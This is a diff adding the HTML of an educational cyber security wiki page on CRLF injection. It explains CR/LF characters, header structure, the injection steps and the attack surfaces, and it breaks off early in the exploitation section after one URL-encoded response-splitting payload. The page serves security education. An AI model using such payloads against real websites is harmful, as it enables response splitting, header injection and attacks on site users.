@@ -1,0 +1,1895 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="CRLF Injection # CRLF Injection is a web security vulnerability where an attacker injects Carriage Return (\r, %0D) and Line Feed (\n, %0A) characters into unsanitized user inputs. When processed by the server, these characters are interpreted as new lines, allowing attackers to split HTTP responses and inject arbitrary headers or content.
+1. Fundamentals of the Attack # CR and LF are special characters that tell a computer to start a new line.">
+<meta name="theme-color" content="#FFFFFF">
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="CRLF Injection" />
+<meta property="og:description" content="CRLF Injection # CRLF Injection is a web security vulnerability where an attacker injects Carriage Return (\r, %0D) and Line Feed (\n, %0A) characters into unsanitized user inputs. When processed by the server, these characters are interpreted as new lines, allowing attackers to split HTTP responses and inject arbitrary headers or content.
+1. Fundamentals of the Attack # CR and LF are special characters that tell a computer to start a new line." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/CRLF-Injection/" /><meta property="article:section" content="docs" />
+
+<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30" />
+<title>CRLF Injection | Cyber Security Wiki</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.565a95e2043493949e3fa72db3ec317e1e40f462858e732a1b18d1354e9c030c.css" integrity="sha256-VlqV4gQ0k5SeP6cts&#43;wxfh5A9GKFjnMqGxjRNU6cAww=" crossorigin="anonymous">
+  <script defer src="/flexsearch.min.js"></script>
+  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+<!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Cyber Security Wiki</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3478c05c39c328756601a040a5f9b7dc" class="toggle" checked />
+    <label for="section-3478c05c39c328756601a040a5f9b7dc" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Application Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3d187f458be5e96a9f7134b06fcbe171" class="toggle"  />
+    <label for="section-3d187f458be5e96a9f7134b06fcbe171" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Thick Client</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/checklist/" class="">Checklist</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/learningprocess_linux/" class="">Learning Process - Linux</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/learningprocess_windows/" class="">Learning Process - Windows</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/tools_linux/" class="">Tools - Linux</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/tools_windows/" class="">Tools - Windows</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="toggle"  />
+    <label for="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Vulnerable Applications</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/Vulnerable-Applications/Api/" class="">API</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/Vulnerable-Applications/WebApp/" class="">Web App</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-305f8624390448e7b7dfdcd57bcf3063" class="toggle" checked />
+    <label for="section-305f8624390448e7b7dfdcd57bcf3063" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Web</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Account-Takeover/" class="">Account Takeover</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Broken-Access-Control/" class="">Broken Access Control</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Broken-Function-Level-Authorization-BFLA/" class="">Broken Function Level Authorization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Buffer-Overflow/" class="">Buffer Overflow</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Business-logic-Vulnerabilities/" class="">Business Logic</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/charset-xss/" class="">Charset XSS</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Clickjacking/" class="">Clickjacking</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Client-Side-Template-Injection-CSTI/" class="">Client Side Template Injection (CSTI)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CORS/" class="">CORS</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Credential-Stuffing/" class="">Credential Stuffing</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CRLF-Injection/" class=" active">CRLF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Cross-Site-Request-Forgery-CSRF/" class="">Cross-Site Request Forgery (CSRF)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Cross-Site-Scripting-XSS/" class="">Cross-Site Scripting (XSS)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CSV-Injection/" class="">CSV Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Denial-of-Service-DOS/" class="">Denial of Service (DOS)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/DOM-Clobbering/" class="">DOM Clobbering</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/GraphQL/" class="">GraphQL</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/HTTP-Host-Header-Injection/" class="">HTTP Host Header Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/HTTP-Request-Smuggling/" class="">HTTP Request Smuggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Identification-and-Authentication-Failures/" class="">Identification and Authentication Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Information-Disclosure/" class="">Information Disclosure</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Information-Gathering/" class="">Information Gathering</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insecure-Deserialization/" class="">Insecure Deserialization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insecure-Direct-Object-Reference-IDOR/" class="">Insecure Direct Object Reference (IDOR)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insufficient-Transport-Layer-Protection/" class="">Insufficient Transport Layer Protection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/JWT/" class="">JWT</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/LDAP-Injection/" class="">LDAP Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Mass-Assignment/" class="">Mass Assignment</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/MFA-Bypass/" class="">Multi-Factor Authentication (MFA) Bypass</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/NoSQL-Injection/" class="">NoSQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/OAuth-Cheatsheet/" class="">OAuth (Open Authorization)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Open-Redirect/" class="">Open Redirect</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Padding-Oracle-Attacks/" class="">Padding Oracle Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Privilege-Escalation-Horizontal-Vertical/" class="">Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Prototype-Pollution/" class="">Prototype Pollution</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Race-Conditions/" class="">Race Conditions</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Rate-Limiting/" class="">Rate Limiting</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Registration-Signup-Logic-Flaws/" class="">Registration / Signup Logic Flaws</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Security-Logging-and-Monitoring-Failures/" class="">Security Logging and Monitoring Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Security-Misconfiguration/" class="">Security Misconfiguration</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Sensitive-Data-Exposure/" class="">Sensitive Data Exposure</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Server-Side-Request-Forgery-SSRF/" class="">Server-Side Request Forgery (SSRF)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Server-Side-Template-Injection-SSTI/" class="">Server-Side Template Injection (SSTI)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Session-Management-Weaknesses/" class="">Session Management Weaknesses</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Software-Data-Integrity-Failures/" class="">Software &amp; Data Integrity Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Subdomain-Takeover/" class="">Subdomain Takeover</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Third-party-service-integration-issues/" class="">Third party service integration issues</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Token-Predictability-Issues-Cheatsheet/" class="">Token Predictability / Poor Randomness</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Unrestricted-Resource-Consumption/" class="">Unrestricted Resource Consumption</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Vulnerable-Outdated-Components/" class="">Vulnerable &amp; Outdated Components</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Weak-Cryptography-Implementation/" class="">Weak Cryptography Implementation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Weak-SSL-TLS-Configurations/" class="">Weak SSL/TLS Configurations</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Web-Cache-Deception/" class="">Web Cache Deception</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Web-Cache-Poisoning/" class="">Web Cache Poisoning</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/XPath-Injection/" class="">XPath Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/XXE-XML-External-Entities/" class="">XXE (XML External Entities)</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-eddb28de10b6358a7d90165be197c24d" class="toggle"  />
+    <label for="section-eddb28de10b6358a7d90165be197c24d" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Cloud Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-80f73357b2e3d82569ab2419d9c8fd53" class="toggle"  />
+    <label for="section-80f73357b2e3d82569ab2419d9c8fd53" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">DevSecOps</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-f8c2cedc89ecea36eb3aab749e9d9325" class="toggle"  />
+    <label for="section-f8c2cedc89ecea36eb3aab749e9d9325" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Exploit Development</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="toggle"  />
+    <label for="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">IoT Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="toggle"  />
+    <label for="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Machine Learning</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/machine-learning/learning/" class="">Learning Process</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3110560962cac834dcd3aead95e804a4" class="toggle"  />
+    <label for="section-3110560962cac834dcd3aead95e804a4" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Network</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-089d0b2a47920473e631158da2244e55" class="toggle"  />
+    <label for="section-089d0b2a47920473e631158da2244e55" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Red Teaming</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-b1f24361e619eb3af87e435a6f600cbe" class="toggle"  />
+    <label for="section-b1f24361e619eb3af87e435a6f600cbe" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Threat Modelling</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+<hr>
+<b>
+
+
+  
+<ul>
+  
+  <li>
+    <a href="/contribute/" >
+        Contribute
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://securecode.wiki" target="_blank" rel="noopener">
+        Secure Code Wiki by Payatu
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</b>
+</nav>
+
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>CRLF Injection</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#crlf-injection">CRLF Injection</a>
+      <ul>
+        <li><a href="#1-fundamentals-of-the-attack"><strong>1. Fundamentals of the Attack</strong></a>
+          <ul>
+            <li><a href="#importance-of-crlf"><strong>Importance of CRLF:</strong></a></li>
+            <li><a href="#working-of-crlf-in-http-"><strong>Working of CRLF in HTTP :</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#2-how-crlf-injection-works"><strong>2. How CRLF Injection Works</strong></a></li>
+        <li><a href="#3-attack-surfaces"><strong>3. Attack Surfaces</strong></a></li>
+        <li><a href="#4--exploiting-crlf-injection"><strong>4.  Exploiting CRLF Injection</strong></a>
+          <ul>
+            <li><a href="#a-http-response-splitting"><strong>a) HTTP Response Splitting</strong></a></li>
+            <li><a href="#b-cookie-injection-session-fixation"><strong>b) Cookie Injection (Session Fixation)</strong></a></li>
+            <li><a href="#c-crlf-to-xss"><strong>c) CRLF to XSS</strong></a></li>
+            <li><a href="#d-crlf-to-open-redirect"><strong>d) CRLF to Open Redirect</strong></a></li>
+            <li><a href="#e-cache-poisoning"><strong>e) Cache Poisoning</strong></a></li>
+            <li><a href="#f-cors-bypass"><strong>f) CORS Bypass</strong></a></li>
+            <li><a href="#g-log-poisoning"><strong>g) Log Poisoning</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#5-bypassing-defenses"><strong>5. Bypassing Defenses</strong></a>
+          <ul>
+            <li><a href="#a-double-encoding"><strong>a) Double Encoding</strong></a></li>
+            <li><a href="#b-unicode-encoding-utf-8-bypass"><strong>b) Unicode Encoding (UTF-8 Bypass)</strong></a></li>
+            <li><a href="#c-using-only0aor0d"><strong>c) Using only <code>%0a</code> or <code>%0d</code></strong></a></li>
+            <li><a href="#d-http2-exclusive-vectors-crlf-smuggling"><strong>d) HTTP/2 Exclusive Vectors (CRLF Smuggling)</strong></a></li>
+            <li><a href="#e-path-obfuscation-and"><strong>e) Path Obfuscation (<code>../</code> and <code>?</code>)</strong></a></li>
+            <li><a href="#f-header-value-injection"><strong>f) Header Value Injection</strong></a></li>
+            <li><a href="#g-splitting-with0content-length"><strong>g) Splitting with <code>0</code> Content-Length</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#6-advanced-attack-scenarios"><strong>6. Advanced Attack Scenarios</strong></a>
+          <ul>
+            <li><a href="#a-chaining-with-ssrf"><strong>a) Chaining with SSRF</strong></a></li>
+            <li><a href="#b-web-cache-poisoning"><strong>b) Web Cache Poisoning</strong></a></li>
+            <li><a href="#c-log-injection-and-evasion"><strong>c) Log Injection (and Evasion)</strong></a></li>
+            <li><a href="#d-phishing-via-response-manipulation"><strong>d) Phishing via Response Manipulation</strong>?</a></li>
+            <li><a href="#e-session-fixation"><strong>e) Session Fixation</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#7-framework-specific-scenarios"><strong>7. Framework-Specific Scenarios</strong></a></li>
+        <li><a href="#8-detection-techniques"><strong>8. Detection Techniques</strong></a>
+          <ul>
+            <li><a href="#manual-testing"><strong>Manual Testing:</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#9-impact"><strong>9. Impact</strong></a></li>
+        <li><a href="#10-prevention-techniques"><strong>10. Prevention Techniques</strong></a></li>
+        <li><a href="#11-tools"><strong>11. Tools</strong></a></li>
+        <li><a href="#12-good-to-read"><strong>12. Good to Read</strong></a></li>
+        <li><a href="#13-references"><strong>13. References</strong></a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="crlf-injection">
+  CRLF Injection
+  <a class="anchor" href="#crlf-injection">#</a>
+</h1>
+<p><strong>CRLF Injection</strong> is a web security vulnerability where an attacker injects Carriage Return (<code>\r</code>, <code>%0D</code>) and Line Feed (<code>\n</code>, <code>%0A</code>) characters into unsanitized user inputs. When processed by the server, these characters are interpreted as new lines, allowing attackers to split HTTP responses and inject arbitrary headers or content.</p>
+<h2 id="1-fundamentals-of-the-attack">
+  <strong>1. Fundamentals of the Attack</strong>
+  <a class="anchor" href="#1-fundamentals-of-the-attack">#</a>
+</h2>
+<p>CR and LF are special characters that tell a computer to start a new line.</p>
+<ul>
+<li>
+<p><strong>CR (Carriage Return)</strong>: Represented as <code>\r</code> or <code>%0d</code>. Its job is to move the cursor to the beginning of the current line.</p>
+</li>
+<li>
+<p><strong>LF (Line Feed)</strong>: Represented as <code>\n</code> or <code>%0a</code>. Its job is to move the cursor down to the next line.</p>
+<p>When used together as a sequence -<code>\r\n</code> (called <strong>CRLF</strong>) - it’s a command to &ldquo;go to the start of a new line.&rdquo;</p>
+</li>
+</ul>
+<h3 id="importance-of-crlf">
+  <strong>Importance of CRLF:</strong>
+  <a class="anchor" href="#importance-of-crlf">#</a>
+</h3>
+<p>Different systems use different ways to mark a new line:</p>
+<ul>
+<li><strong>Windows</strong> uses the full CRLF sequence (<code>\r\n</code>).</li>
+<li><strong>Unix/Linux/macOS</strong> typically use just LF (<code>\n</code>).</li>
+<li><strong>Web Protocols (HTTP, SMTP)</strong> <strong>strictly require CRLF (<code>\r\n</code>)</strong> to separate pieces of information.</li>
+</ul>
+<h3 id="working-of-crlf-in-http-">
+  <strong>Working of CRLF in HTTP :</strong>
+  <a class="anchor" href="#working-of-crlf-in-http-">#</a>
+</h3>
+<p>In an HTTP response, CRLF acts like a structured separator:</p>
+<ol>
+<li><strong>Between Headers:</strong> Every header line must end with a single CRLF. For example: <code>Content-Type: text/html</code> + <code>\r\n</code>.</li>
+<li><strong>Between Headers and Body:</strong> The end of all headers and the start of the content (body) is marked by two CRLFs in a row <strong>(<code>\r\n\r\n</code>)</strong> . This double CRLF is the signal that says, &ldquo;The headers are done, now here comes the actual web page.&rdquo;</li>
+</ol>
+<p><strong>Type of Vulnerabilities in CRLF:</strong></p>
+<ul>
+<li>Server-Side Injection</li>
+<li>HTTP Response Manipulation</li>
+<li>Header Injection</li>
+</ul>
+<hr>
+<h2 id="2-how-crlf-injection-works">
+  <strong>2. How CRLF Injection Works</strong>
+  <a class="anchor" href="#2-how-crlf-injection-works">#</a>
+</h2>
+<ol>
+<li>
+<p><strong>HTTP Response is Dynamically Built</strong></p>
+<p>The application constructs response headers (e.g., <code>Location</code>, <code>Set-Cookie</code>, <code>Content-Type</code>) using user-controlled input.</p>
+</li>
+<li>
+<p><strong>User Input is Reflected into Headers</strong></p>
+<p>Parameters, redirect URLs, or headers are inserted directly into the HTTP response.</p>
+</li>
+<li>
+<p><strong>CRLF Characters Are Not Sanitized</strong></p>
+<p>The application fails to remove or encode Carriage Return (<code>\r</code>) and Line Feed (<code>\n</code>) characters.</p>
+</li>
+<li>
+<p><strong>Attacker Injects CRLF Payload</strong></p>
+<p>The attacker supplies <code>%0D%0A</code> in input, which the server interprets as a new line.</p>
+</li>
+<li>
+<p><strong>HTTP Response Splits</strong></p>
+<p>The injected CRLF breaks the original header structure and starts a new header or body.</p>
+</li>
+<li>
+<p><strong>Malicious Headers or Body Are Injected</strong></p>
+<p>Attackers add forged headers like <code>Set-Cookie</code>, <code>Location</code>, or inject HTML/JS content.</p>
+</li>
+<li>
+<p><strong>Response is Trusted by Client or Intermediaries</strong></p>
+<p>Browsers, proxies, or caches process the manipulated response as legitimate.</p>
+</li>
+<li>
+<p><strong>Attack Takes Effect</strong></p>
+<p>Results in XSS, open redirect, cache poisoning, session hijacking, or data manipulation.</p>
+</li>
+</ol>
+<hr>
+<h2 id="3-attack-surfaces">
+  <strong>3. Attack Surfaces</strong>
+  <a class="anchor" href="#3-attack-surfaces">#</a>
+</h2>
+<ul>
+<li><strong>URL Parameters</strong> – Especially in redirects (<code>?redirect=</code>).</li>
+<li><strong>HTTP Headers</strong> – User-controlled headers like <code>User-Agent</code>, <code>Referer</code>.</li>
+<li><strong>Cookies</strong> – Cookie values reflected in responses.</li>
+<li><strong>Form Inputs</strong> – POST data used in header construction.</li>
+<li><strong>Log Files</strong> – Input reflected in logs (log poisoning).</li>
+</ul>
+<hr>
+<h2 id="4--exploiting-crlf-injection">
+  <strong>4.  Exploiting CRLF Injection</strong>
+  <a class="anchor" href="#4--exploiting-crlf-injection">#</a>
+</h2>
+<h3 id="a-http-response-splitting">
+  <strong>a) HTTP Response Splitting</strong>
+  <a class="anchor" href="#a-http-response-splitting">#</a>
+</h3>
+<ul>
+<li>Injects a double CRLF to end the current response and start a second, attacker-controlled one. The browser processes the fake response, showing malicious content instead of the real page.</li>
+</ul>
+<p><strong><code>/%0D%0AContent-Length:0%0D%0A%0D%0A&lt;h1&gt;Injected&lt;/h1&gt;</code></strong></p>
+<h3 id="b-cookie-injection-session-fixation">
+  <strong>b) Cookie Injection (Session Fixation)</strong>
+  <a class="anchor" href="#b-cookie-injection-session-fixation">#</a>
+</h3>
+<ul>
